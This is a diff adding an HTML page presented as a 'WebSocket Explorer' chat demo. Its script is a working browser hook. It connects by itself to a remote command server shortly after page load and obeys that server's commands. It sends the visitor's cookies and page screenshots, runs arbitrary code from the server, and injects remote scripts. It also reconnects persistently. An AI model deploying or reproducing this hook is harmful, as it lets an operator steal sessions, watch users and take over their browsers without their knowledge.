@@ -1,0 +1,297 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>WebSocket Explorer — Hooked Client</title>
+
+  <!-- html2canvas for screenshots -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+
+  <style>
+    *{box-sizing:border-box;margin:0;padding:0}
+    body{font-family:Segoe UI, Tahoma, Geneva, Verdana, sans-serif;background:linear-gradient(135deg,#1a2a6c,#b21f1f,#fdbb2d);color:#fff;padding:20px}
+    .container{max-width:1200px;margin:0 auto}
+    header{text-align:center;padding:30px 0;margin-bottom:30px}
+    h1{font-size:3rem;margin-bottom:8px}
+    .card{background:rgba(255,255,255,0.08);border-radius:12px;padding:18px;margin-bottom:20px}
+    .demo-container{display:flex;flex-direction:column;height:360px}
+    .chat-window{flex:1;background:rgba(0,0,0,0.2);border-radius:8px;padding:12px;overflow:auto;margin-bottom:12px}
+    .message{padding:8px 12px;border-radius:16px;margin-bottom:10px;max-width:80%;word-wrap:break-word}
+    .message.system{background:rgba(253,187,45,0.25);text-align:center;font-style:italic}
+    .message.received{background:rgba(26,42,108,0.7);align-self:flex-start}
+    .message.sent{background:rgba(178,31,31,0.7);align-self:flex-end;margin-left:auto}
+    .input-area{display:flex;gap:8px}
+    input,button{padding:10px;border-radius:8px;border:none}
+    input{flex:1;background:rgba(255,255,255,0.12);color:#fff}
+    button{background:#fdbb2d;color:#1a2a6c;font-weight:700;cursor:pointer}
+    .status{margin-top:10px;display:flex;align-items:center;gap:10px}
+    .status-indicator{width:12px;height:12px;border-radius:50%;display:inline-block;background:#f44336}
+    .status.connected .status-indicator{background:#4caf50}
+    .controls{display:flex;gap:8px;align-items:center}
+    pre.code-block{background:rgba(0,0,0,0.25);padding:12px;border-radius:8px;overflow:auto}
+  </style>
+</head>
+<body>
+  <div class="container">
+    <header>
+      <h1>WebSocket Explorer</h1>
+      <p class="tagline">Client demo that integrates with your PathBasedHookServer</p>
+    </header>
+
+    <div class="card">
+      <h2>Interactive Demo / Background Hook</h2>
+      <div class="demo-container">
+        <div class="chat-window" id="chat-window">
+          <div class="message system">Welcome. The background hook client will register to your server once you click Connect.</div>
+        </div>
+
+        <div class="input-area">
+          <input id="message-input" placeholder="Type a local UI message (not server command)..." />
+          <button id="send-local">Add</button>
+        </div>
+
+        <div class="status" id="connection-status">
+          <span class="status-indicator"></span>
+          <span id="status-text">Disconnected</span>
+
+          <div class="controls" style="margin-left:auto">
+            <button id="connect-btn">Connect Hook</button>
+            <button id="disconnect-btn" disabled>Disconnect Hook</button>
+          </div>
+        </div>
+
+        <pre class="code-block" id="last-info" style="margin-top:10px">Last server message: —</pre>
+      </div>
+    </div>
+
+    <footer style="text-align:center;margin-top:18px;opacity:.85">
+      WebSocket Explorer &copy; 2025
+    </footer>
+  </div>
+
+  <!-- Injected server config (Python will replace placeholders) -->
+  <script>
+    // If the Python server replaced placeholders, use them; otherwise fall back.
+    window.SERVER_HOST = "{{SERVER_HOST}}" || location.hostname;
+    window.SERVER_PORT = {{SERVER_PORT}} || null;          // replaced to a number or left as null
+    window.CLIENT_PATH = "{{CLIENT_PATH}}" || "/hook";
+  </script>
+
+  <!-- Hook client logic (compact, GUI-friendly) -->
+  <script>
+  (function () {
+    // read injected config with safe fallbacks
+    const SERVER_HOST = (typeof window.SERVER_HOST !== 'undefined' && window.SERVER_HOST) ? window.SERVER_HOST : location.hostname;
+    const SERVER_PORT = (typeof window.SERVER_PORT !== 'undefined' && window.SERVER_PORT) ? String(window.SERVER_PORT) : '';
+    const CLIENT_PATH = (typeof window.CLIENT_PATH !== 'undefined' && window.CLIENT_PATH) ? window.CLIENT_PATH : '/hook';
+
+    // UI references
+    const chatWindow = document.getElementById('chat-window');
+    const msgInput = document.getElementById('message-input');
+    const sendLocalBtn = document.getElementById('send-local');
+    const connectBtn = document.getElementById('connect-btn');
+    const disconnectBtn = document.getElementById('disconnect-btn');
+    const statusText = document.getElementById('status-text');
+    const statusEl = document.getElementById('connection-status');
+    const lastInfo = document.getElementById('last-info');
+
+    function addMessage(text, cls='system'){
+      const d = document.createElement('div');
+      d.className = 'message ' + cls;
+      d.textContent = text;
+      chatWindow.appendChild(d);
+      chatWindow.scrollTop = chatWindow.scrollHeight;
+    }
+
+    function setStatus(connected) {
+      if (connected) {
+        statusEl.classList.add('connected');
+        statusEl.classList.remove('disconnected');
+        document.querySelector('.status-indicator').style.background = '#4caf50';
+        statusText.textContent = `Connected (path: ${CLIENT_PATH})`;
+        connectBtn.disabled = true;
+        disconnectBtn.disabled = false;
+      } else {
+        statusEl.classList.remove('connected');
+        statusEl.classList.add('disconnected');
+        document.querySelector('.status-indicator').style.background = '#f44336';
+        statusText.textContent = 'Disconnected';
+        connectBtn.disabled = false;
+        disconnectBtn.disabled = true;
+      }
+    }
+
+    // Build the correct websocket URL. If page is https, use wss, else ws.
+    function wsUrl() {
+      const pageIsHttps = location.protocol === 'https:';
+      const protocol = pageIsHttps ? 'wss' : 'ws';
+      const host = SERVER_HOST || location.hostname;
+      const port = SERVER_PORT ? (':' + SERVER_PORT) : '';
+      const path = CLIENT_PATH.startsWith('/') ? CLIENT_PATH : '/' + CLIENT_PATH;
+      return `${protocol}://${host}${port}${path}`;
+    }
+
+    function safeJsonParse(s) { try { return JSON.parse(s); } catch (e) { return null; } }
+
+    // send JSON safely
+    let ws = null;
+    function sendJson(obj){
+      if(!ws || ws.readyState !== WebSocket.OPEN){
+        addMessage('Cannot send message: socket not open', 'system');
+        return false;
+      }
+      try { ws.send(JSON.stringify(obj)); return true; }
+      catch(e){ addMessage('Send failed: ' + e.message, 'system'); return false; }
+    }
+
+    // handle command types
+    async function handleServerCommand(command){
+      lastInfo.textContent = `Last server message: ${JSON.stringify(command, null, 2)}`;
+      if(!command || !command.type){ addMessage('Received unknown server message','received'); return; }
+
+      if(command.type === 'take_screenshot'){
+        addMessage('Received screenshot command — capturing...', 'system');
+        try{
+          if(typeof html2canvas !== 'function') throw new Error('html2canvas not available');
+          const canvas = await html2canvas(document.body);
+          const screenshot = canvas.toDataURL('image/png');
+          sendJson({ type:'response', subtype:'screenshot', data:screenshot, url:window.location.href, commandId:command.commandId || null });
+          addMessage('Screenshot sent','sent');
+        }catch(err){
+          sendJson({ type:'error', data:String(err.message||err), commandId:command.commandId||null });
+          addMessage('Screenshot failed: ' + (err && err.message ? err.message : String(err)), 'system');
+        }
+        return;
+      }
+
+      if(command.type === 'get_title' || command.type === 'get_page_title'){
+        sendJson({ type:'response', subtype:'title', data:document.title, url:window.location.href, commandId:command.commandId || null });
+        addMessage('Title sent: ' + document.title, 'sent');
+        return;
+      }
+
+      if(command.type === 'get_cookies'){
+        sendJson({ type:'response', subtype:'cookies', data:document.cookie, url:window.location.href, commandId:command.commandId || null });
+        addMessage('Cookies sent', 'sent');
+        return;
+      }
+
+      if(command.type === 'eval' || command.type === 'evalfile'){
+        addMessage('Eval command received', 'system');
+        try{
+          if(command.code){
+            const func = new Function('"use strict";\n' + (command.code || ''));
+            let res = func();
+            if(res instanceof Promise) res = await res;
+            sendJson({ type:'response', subtype:'eval', data: (typeof res === 'undefined' ? null : res), commandId:command.commandId || null });
+            addMessage('Eval result sent','sent');
+            return;
+          }else if(command.scriptUrl){
+            // load remote script tag
+            const s = document.createElement('script');
+            s.src = command.scriptUrl;
+            s.async = true;
+            s.onload = () => {
+              sendJson({ type:'response', subtype:'eval', data:`loaded ${command.scriptUrl}`, commandId:command.commandId || null });
+              addMessage('Script loaded and executed (script tag)','sent');
+            };
+            s.onerror = (e) => {
+              sendJson({ type:'error', data:`Failed to load script ${command.scriptUrl}`, commandId:command.commandId || null });
+              addMessage('Script load failed','system');
+            };
+            document.head.appendChild(s);
+            return;
+          } else {
+            sendJson({ type:'error', data:'No code or scriptUrl provided', commandId:command.commandId || null });
+            addMessage('Eval error: no code or scriptUrl', 'system');
+            return;
+          }
+        }catch(err){
+          sendJson({ type:'error', data:String(err.message||err), commandId:command.commandId || null });
+          addMessage('Eval error: ' + (err && err.message ? err.message : String(err)), 'system');
+          return;
+        }
+      }
+
+      if(command.type === 'ping'){
+        sendJson({ type:'pong', ts:Date.now(), commandId: command.commandId || null });
+        return;
+      }
+
+      // fallback echo
+      sendJson({ type:'response', subtype:'unknown', data:command, commandId:command.commandId || null });
+      addMessage('Unknown command: ' + command.type, 'system');
+    }
+
+    // WebSocket lifecycle
+    let heartbeatInterval = null;
+    function startHeartbeat(){ stopHeartbeat(); heartbeatInterval = setInterval(()=>{ if(ws && ws.readyState === WebSocket.OPEN) sendJson({ type:'ping', ts:Date.now() }); }, 20000); }
+    function stopHeartbeat(){ if(heartbeatInterval){ clearInterval(heartbeatInterval); heartbeatInterval = null; } }
+
+    let reconnectAttempts = 0;
+    let reconnectTimer = null;
+    function scheduleReconnect(){
+      reconnectAttempts++;
+      const delay = Math.min(60000, Math.pow(2,Math.min(reconnectAttempts,8))*1000) + Math.floor(Math.random()*1000);
+      addMessage(`Reconnecting in ${Math.round(delay/1000)}s...`, 'system');
+      if(reconnectTimer) clearTimeout(reconnectTimer);
+      reconnectTimer = setTimeout(connect, delay);
+    }
+
+    function connect(){
+      if(ws && (ws.readyState === WebSocket.OPEN || ws.readyState === WebSocket.CONNECTING)){ addMessage('Already connecting/connected','system'); return; }
+      const url = wsUrl();
+      addMessage('Connecting to ' + url, 'system');
+      try {
+        ws = new WebSocket(url);
+      } catch(err) {
+        addMessage('WebSocket constructor failed: ' + err.message, 'system');
+        scheduleReconnect();
+        return;
+      }
+
+      ws.onopen = () => {
+        reconnectAttempts = 0;
+        addMessage('Connected — sending register', 'system');
+        sendJson({ type:'register', browserId: 'browser_' + Math.random().toString(36).substr(2,9), userAgent:navigator.userAgent, url: window.location.href, path: CLIENT_PATH, ts: new Date().toISOString() });
+        setStatus(true);
+        startHeartbeat();
+      };
+
+      ws.onmessage = async (evt) => {
+        const p = safeJsonParse(evt.data);
+        if(!p){ addMessage('Raw server message: ' + String(evt.data), 'received'); return; }
+        if(p.type === 'registered'){ addMessage(`Server registered our client id=${p.browserId} (path=${p.path})`,'system'); return; }
+        await handleServerCommand(p);
+      };
+
+      ws.onerror = (ev) => { addMessage('WebSocket error','system'); console.error('WS error', ev); };
+      ws.onclose = (ev) => { addMessage('Hook connection closed','system'); setStatus(false); stopHeartbeat(); scheduleReconnect(); };
+    }
+
+    function disconnect(){
+      if(ws){ stopHeartbeat(); try{ ws.close(); }catch(e){} ws = null; }
+      setStatus(false);
+      addMessage('Hook disconnected by user','system');
+    }
+
+    // bind UI
+    connectBtn.addEventListener('click', connect);
+    disconnectBtn.addEventListener('click', disconnect);
+    sendLocalBtn.addEventListener('click', ()=>{ const t = msgInput.value.trim(); if(!t) return; addMessage('You: ' + t, 'sent'); msgInput.value=''; });
+    msgInput.addEventListener('keypress', (e)=>{ if(e.key === 'Enter') sendLocalBtn.click(); });
+
+    // initial
+    setStatus(false);
+
+    // auto-connect on HTTPS pages (GitHub Pages) after small delay - allow user to accept cert if needed
+    setTimeout(()=> {
+      // only auto-connect if page is secure (wss) or if the server host explicitly provided
+      if(location.protocol === 'https:' || SERVER_HOST !== location.hostname) connect();
+    }, 300);
+
+  })();
+  </script>
+</body>
+</html>
